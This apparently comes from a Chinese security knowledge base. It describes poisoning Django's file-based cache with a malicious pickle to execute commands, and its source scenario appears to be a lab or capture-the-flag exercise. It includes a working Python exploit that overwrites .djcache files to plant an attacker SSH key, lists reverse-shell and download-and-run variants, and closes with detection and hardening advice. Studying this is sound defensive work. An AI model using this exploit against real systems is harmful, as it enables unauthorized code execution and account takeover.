---
id: web-python-deserialization-django-file-cache-pickle-rce
title: Django 文件缓存投毒触发 Pickle 反序列化 RCE
type: scenario
domain: web
path: web/python/deserialization
technique: django-filecache-pickle-rce
tags:
- python
- django
- pickle
- deserialization
- cache
- rce
- file-write
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V8
  verified_at: '2026-11-05T00:26:52+08:00'
  notes: 已对照原文与图 19-28 核对：settings.py 的 FileBasedCache /var/tmp/django_cache、cache_page(60) 的 /explore、覆盖 .djcache 为 subprocess.Popen 的 __reduce__ pickle、访问后 500 但写入 sandy authorized_keys 并登录成功，均与原文一致；该链依赖前置本地文件写，卡内已注明；PoC 未在本机执行。
url: /docs/web/python/deserialization/web-python-deserialization-django-file-cache-pickle-rce/
draft: false
kb_aliases:
- Django 缓存投毒
- .djcache pickle
- FileBasedCache RCE
- cache_page 反序列化
- Django pickle 反序列化
---

## 一句话结论

Django 的 `FileBasedCache` 用 pickle 序列化缓存值；攻击者若能在缓存目录写入/替换 `.djcache` 文件，把内容换成带 `__reduce__` 的 pickle，访问带 `cache_page` 的路由触发缓存读取时即反序列化执行命令。

## 原理

- `CACHES` 使用 `django.core.cache.backends.filebased.FileBasedCache`，`LOCATION=/var/tmp/django_cache`，每个缓存键对应一个 `.djcache` 文件，内容是 Python pickle 序列化的缓存值。
- Django 读取缓存时对文件内容执行 `pickle.load`；pickle 反序列化会调用对象 `__reduce__` 指定的可调用对象与参数。
- 攻击者定义：
  ```python
  class Exploit:
      def __reduce__(self):
          return (subprocess.Popen, (["/bin/bash", "-c", "..."],))
  ```
  `pickle.dumps(Exploit())` 生成的字节流在 `pickle.load` 时即执行 `subprocess.Popen`。
- 触发点：`@cache_page(60)` 装饰的 `/explore` 路由。请求该路由时，Django 先查缓存；若命中，读取并 unpickle 被替换的 `.djcache`，payload 执行。
- 该链要求“本地文件写”前置（原文通过 Web SSTI 泄露 SSH 凭据拿到 mikey shell），属于“任意文件写 + 缓存反序列化”的组合；缓存目录权限、文件所有者与 Django 进程用户决定能否替换。
- 缓存过期时间 60 秒，原文利用“每 60 秒重新生成”的窗口替换文件；替换后立即访问 `/explore` 即可在重新生成前触发。

## 触发条件

- 目标使用 Django `FileBasedCache`（或任何对不可信文件做 pickle 反序列化的缓存后端）。
- 攻击者能在缓存目录创建/覆盖 `.djcache` 文件（本地 shell、任意文件写、共享卷、容器挂载等）。
- 存在可预测/可触发的缓存键与 `cache_page` 路由（如 `/explore`）。
- Django 进程对替换后的文件有读权限；缓存未使用签名/JSON 序列化。

## 利用步骤

1. 获取本地文件写权限（原文：SSTI 泄露 SSH 凭据 → SSH 登录 mikey）。
2. 确认 Django 配置：`CACHES` 后端为 `FileBasedCache`、`LOCATION` 路径、`cache_page` 装饰的路由。
3. 在本地生成 pickle payload（`__reduce__` → `subprocess.Popen`），内容为写 SSH 公钥/反弹 shell 等命令。
4. 备份并覆盖缓存目录下所有 `.djcache` 文件为 payload 字节。
5. 访问 `/explore`（或其他 `cache_page` 路由）触发缓存读取与 unpickle。
6. 验证命令执行（如目标用户 `authorized_keys` 被写入、反弹 shell 上线）；即使页面返回 500，payload 可能已执行。

## PoC

```python
#!/usr/bin/env python3
import pickle
import subprocess
from pathlib import Path

class Exploit:
    def __reduce__(self):
        cmd = ("mkdir -p /home/sandy/.ssh; "
               "echo 'ssh-ed25519 AAAA... attacker' >> /home/sandy/.ssh/authorized_keys")
        return (subprocess.Popen, (["/bin/bash", "-c", cmd],))

payload = pickle.dumps(Exploit())

for f in Path('/var/tmp/django_cache').iterdir():
    if f.is_file() and f.suffix == ".djcache":
        f.rename(f"{f}.bk")
        f.write_bytes(payload)
        print(f"Poisoned {f}")
```

随后访问 `http://target/explore` 触发；原文页面返回 500，但 SSH 公钥已写入，成功以 `sandy` 登录。

## 变体与关联

- 变体：缓存后端换成 Redis/Memcached 且值使用 pickle 时，若攻击者可写缓存（SSRF/未授权 Redis），可复用同一 `__reduce__` 思路。
- 变体：不覆盖所有缓存文件，只针对已知缓存键（如 `/explore` 生成的 key）替换，降低影响面。
- 变体：payload 改为反弹 shell、下载执行、写 crontab 等，按目标环境选择。
- 关联：该链的前置“本地文件写”可由 SSTI、任意文件上传、路径穿越等提供；与 Django 模板注入卡构成完整外网到内网链路。
- 关联卡片：[[web-python-ssti-django-username-template-source-credential-leak]]

## 检测与防御

- 检测：缓存目录 `.djcache` 文件被重命名/覆盖、出现 `.bk` 备份；文件内容非正常 pickle 结构或包含 `subprocess`/`os.system` 字符串。
- 检测：`/explore` 等缓存路由在缓存过期窗口被高频访问；Django 进程在读取缓存后派生 shell/写 SSH 目录。
- 检测：缓存目录权限过大（其他用户可写）；Django 进程用户与缓存文件所有者不一致。
- 修复：不要使用对不可信文件做 pickle 反序列化的缓存后端；改用 Redis/数据库缓存并限制写权限，或使用签名/JSON 序列化。
- 加固：缓存目录仅 Django 进程用户可写（0700）；容器化隔离；最小权限运行；监控文件完整性。
- 注意：Django 缓存不是信任边界，任何能写缓存文件的人都可视为能执行代码。
